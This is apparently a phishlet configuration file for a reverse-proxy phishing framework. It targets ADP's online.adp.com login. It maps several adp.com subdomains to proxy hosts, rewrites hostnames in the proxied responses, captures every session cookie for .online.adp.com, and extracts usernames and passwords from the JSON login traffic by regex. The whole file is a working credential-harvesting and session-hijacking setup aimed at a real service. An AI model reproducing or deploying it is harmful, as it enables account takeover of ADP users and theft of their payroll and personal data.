author: '@fin3ss3g0d'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'online', orig_sub: 'online', domain: 'adp.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'adp.com', session: false, is_landing: false}
  - {phish_sub: 'workforcenow', orig_sub: 'workforcenow', domain: 'adp.com', session: false, is_landing: false}
  - {phish_sub: 'dyn-msg-service.prod', orig_sub: 'dyn-msg-service.prod', domain: 'adp.com', session: false, is_landing: false}
sub_filters:
   - {triggers_on: 'online.adp.com', orig_sub: 'online', domain: 'adp.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', application/javascript]}
   - {triggers_on: 'online.adp.com', orig_sub: 'online', domain: 'adp.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
   - {triggers_on: 'online.adp.com', orig_sub: 'online', domain: 'adp.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'online.adp.com', orig_sub: 'online', domain: 'adp.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'online.adp.com', orig_sub: 'online', domain: 'adp.com', search: 'noknokeval', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'dyn-msg-service.prod.adp.com', orig_sub: 'dyn-msg-service.prod', domain: 'adp.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}

auth_tokens:
  - domain: '.online.adp.com'
    keys: ['.*,regexp']
credentials:
  username:
    key: ''
    search: '"identifier":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '"password":"([^"]*)"'
    type: 'json'
login:
  domain: 'online.adp.com'
  path: 'olp/olplanding.html?APPID=WFNPORTAL'